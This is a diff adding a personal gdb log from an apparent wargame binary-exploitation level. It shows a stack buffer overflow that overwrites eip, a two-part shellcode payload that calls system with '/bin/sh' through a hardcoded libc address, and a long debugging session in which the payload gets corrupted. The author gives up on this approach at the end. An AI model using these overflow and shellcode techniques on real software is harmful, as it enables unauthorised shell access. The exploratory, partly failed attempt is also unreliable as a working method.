@@ -1,0 +1,239 @@
+r
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+SIGSEGV -> 0x4d4c4b4a in ?? ()
+
+that easy? really? this is the ascii for "MLKJ" or "JKLM" to be precise since we are in little endian
+since we segfault after the final print, we put a break to see exactly how the memory got messed up and check what is available for our injection (stripped down to the minimum, our injection in level9 is 23 bytes long)
+
+b main
+r
+disas
+b *0x080485c5
+c
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+info registers
+eax            0x46     70
+ecx            0xffffffff       -1
+edx            0xb7fd28b8       -1208145736
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6e0       0xbffff6e0
+ebp            0xbffff728       0xbffff728
+
+disas
+=> 0x080485c5 <+33>:    mov    $0x0,%eax #set eax to 0, so 'return 0'
+   0x080485ca <+38>:    leave #shortcut for mov $esp, $ebp; pop $ebp
+   0x080485cb <+39>:    ret #shortcut for pop $eip
+
+x/s 0xbffff728
+0xbffff728:      "FGHIJKLMNOPQRST\364", <incomplete sequence \375\267>
+
+si 2
+info register esp
+esp            0xbffff72c       0xbffff72c
+
+x/s 0xbffff72c
+0xbffff72c:      "JKLMNOPQRST\364", <incomplete sequence \375\267>
+
+x/s 0xbffff72c-54
+0xbffff6f6:      "abcdefghijklmnopqrstABCDEFGHIJKLMNOPQRST\364\017\375\267 ABCDEFGHIJKLMNOPQRST\364", <incomplete sequence \375\267>
+
+we have 40 characters, but only 29 continuous (since 'JKLM' will be used to override eip), to work with. should be plenty enough
+one thing though: there is no clear way to fit the \0 after '/bin/sh', so we will have to update the asm in a way that fixes the missing null byte (eax is already set to 0, we could just write a single byte at a specific address in ourselves to null terminate /bin/sh)
+another thing: the payload will need to be split in 2, one using the 20 bytes of the first buffer, and the other for extra bytes and pointing to the main buffer
+
+p/x 0xbffff72c-54 -> 0xbffff6f6 (position of our exploit)
+p/x 0xbffff6f6+20 -> 0xbffff70a (position where /bin/sh will be writen)
+
+(tried using execve, see asm)
+
+r < <(cat /tmp/payload_b0a;cat /tmp/payload_b0b;cat)
+kinda works, but I get broken pipes and random issues, and even worse, I get disconnected from the vm if I run the same command outside gdb
+maybe using the syscall execve was not a good idea? (since execve replace the current process with a new process)
+let's use the asm from level2 instead (call system instead of execve)
+
+r < <(cat /tmp/payload_b0a;cat /tmp/payload_b0b;cat)
+this time we have a segfault in a valid address (0xbffff707), so we can debug our payload
+
+b *0xbffff707
+r < <(cat /tmp/payload_b0a;cat /tmp/payload_b0b;cat)
+disas (nothing to see)
+x/i 0xbffff707 => 0xbffff707:  add    %al,0x35(%edx)
+wait, we are near our exploit, but I don't recognize this instruction
+
+x/s 0xbffff72c-54
+0xbffff6f6:      "h\v\367\377\277\242\022\367\377\277\270`\260", <incomplete sequence \346>
+
+x/16i 0xbffff72c-54
+   0xbffff6f6:  push   $0xbffff70b
+   0xbffff6fb:  mov    %al,0xbffff712
+   0xbffff700:  mov    $0xe6b060,%eax #here, the command is broken, should be mov $0xb7e6b060,%eax
+   0xbffff705:  add    %al,(%eax) #and here should be call *%eax
+=> 0xbffff707:  add    %al,0x35(%edx)
+   0xbffff70a:  add    %al,(%eax)
+   0xbffff70c:  bound  %ebp,0x6e(%ecx)
+   0xbffff70f:  das
+   0xbffff710:  jae    0xbffff77a
+   0xbffff712:  add    %dh,%dh
+   0xbffff714:  idiv   %bh
+   0xbffff716:  mov    $0xfd0ff442,%edi
+   0xbffff71b:  mov    $0x0,%bh
+   0xbffff71d:  add    %al,(%eax)
+   0xbffff71f:  add    %al,(%eax)
+   0xbffff721:  add    %al,(%eax)
+
+x/s 0xbffff70b <nothing> (should be /bin/sh)
+
+ok, we clearly got something wrong with our payload, did we left a '\0' or '\n' somewhere? hexdump didn't show anything wrong
+
+b *0x080485c5
+r < <(cat /tmp/payload_b0a;cat /tmp/payload_b0b;cat)
+disas
+info registers
+eax            0x46     70
+ecx            0xffffffff       -1
+edx            0xb7fd28b8       -1208145736
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6e0       0xbffff6e0
+ebp            0xbffff728       0xbffff728
+
+x/s 0xbffff728
+"/sh0\366\366\377\277BBBBBBB\364", <incomplete sequence \375\267>
+
+si 2
+info register esp
+esp            0xbffff6e0       0xbffff6e0
+
+x/8i 0xbffff72c-54
+   0xbffff6f6:  push   $0xbffff70b
+   0xbffff6fb:  mov    %al,0xbffff712
+   0xbffff700:  mov    $0xb7e6b060,%eax
+   0xbffff705:  call   *%eax
+   0xbffff707:  add    %al,0x42(%edx)
+   0xbffff70a:  inc    %edx
+   0xbffff70b:  das
+   0xbffff70c:  bound  %ebp,0x6e(%ecx)
+
+ok, we good so far, let's check if our offset to /bin/sh is correct:
+x/s 0xbffff70b ->  "/bin/sh0\366..."
+x/s 0xbffff712 -> "0\366..."
+
+ok all seem good
+
+si 2
+info registers
+
+eax            0x0      0
+ecx            0xffffffff       -1
+edx            0xb7fd28b8       -1208145736
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6e0       0xbffff6e0
+ebp            0xbffff728       0xbffff728
+
+x/xw 0xbffff6e0 -> 0xbffff6f6
+x/8i 0xbffff6f6
+si
+does a jump to 0x30687333 before returning to 0xbffff6fb
+p 0xbffff6fb-0xbffff6f6 (offset of 5)
+
+seems like the push 0xbffff70b was skipped
+x/8i 0xbffff6fb
+=> 0xbffff6fb:  mov    %al,0xbffff712
+   0xbffff700:  mov    $0xb7e6b060,%eax
+   0xbffff705:  call   *%eax
+   0xbffff707:  add    %al,0x42(%edx)
+   0xbffff70a:  inc    %edx
+   0xbffff70b:  das
+   0xbffff70c:  bound  %ebp,0x6e(%ecx)
+   0xbffff70f:  das
+
+x/xw $esp
+0xbffff72c:     0xbffff70b
+
+no, the push worked
+
+si
+x/8i 0xbffff700
+
+x/s 0xbffff70b -> "/bin/sh"
+
+si
+si
+
+disas (we are in system, as expected)
+c
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff707
+
+the return position after calling system is invalid...
+
+   0xbffff6fb:  mov    %al,0xbffff712
+   0xbffff700:  mov    $0xe6b060,%eax
+   0xbffff705:  add    %al,(%eax)
+=> 0xbffff707:  add    %ch,0x62000035(%edi)
+   0xbffff70d:  imul   $0xf6006873,0x2f(%esi),%ebp
+   0xbffff714:  idiv   %bh
+   0xbffff716:  mov    $0xfd0ff442,%edi
+   0xbffff71b:  mov    $0x0,%bh
+
+not only that but our buffers got scrambled
+
+restart again:
+d
+b *0x080485c5
+r < <(cat /tmp/payload_b0a;cat /tmp/payload_b0b;cat)
+b *0xb7e6b06f
+c
+disas
+   0xb7e6b060 <+0>:     sub    $0x1c,%esp
+   0xb7e6b063 <+3>:     mov    %esi,0x14(%esp)
+   0xb7e6b067 <+7>:     mov    0x20(%esp),%esi
+   0xb7e6b06b <+11>:    mov    %ebx,0x10(%esp)
+=> 0xb7e6b06f <+15>:    call   0xb7f56c73
+   0xb7e6b074 <+20>:    add    $0x165f80,%ebx
+   0xb7e6b07a <+26>:    mov    %edi,0x18(%esp)
+   0xb7e6b07e <+30>:    test   %esi,%esi
+   0xb7e6b080 <+32>:    je     0xb7e6b0a8 <system+72>
+   0xb7e6b082 <+34>:    mov    %gs:0xc,%eax
+   0xb7e6b088 <+40>:    test   %eax,%eax
+   0xb7e6b08a <+42>:    jne    0xb7e6b0cc <system+108>
+...
+
+info functions
+...
+0xb7f568d0  __frame_state_for
+0xb7f56c80  atexit
+...
+
+we are calling something between atexit and __frame_state_for? the heck is system doing?
+
+remember that call is the same as: push <next eip> + jump <address>
+
+x/8i 0xb7f56c73
+=> 0xb7f56c73:  mov    (%esp),%ebx
+   0xb7f56c76:  ret
+   0xb7f56c77:  mov    (%esp),%ecx
+   0xb7f56c7a:  ret
+   0xb7f56c7b:  mov    (%esp),%edx
+   0xb7f56c7e:  ret
+   0xb7f56c7f:  nop
+
+x/xw $esp -> 0xb7e6b074
+x/x $ebx (is about to be added with 0x165f80)
+
+let's break further down and check our buffer every x instructions
+b *0xb7e6b080
+c
+x/5i 0xbffff6f6
+
+do {
+si 8
+x/5i 0xbffff6f6
+} while our asm is looking fine
+
+note: at some point we end in unknown territory: 0xb7e59f8a
+
+you know what? f this, we obviously went in the wrong direction, let's find a new angle of attack
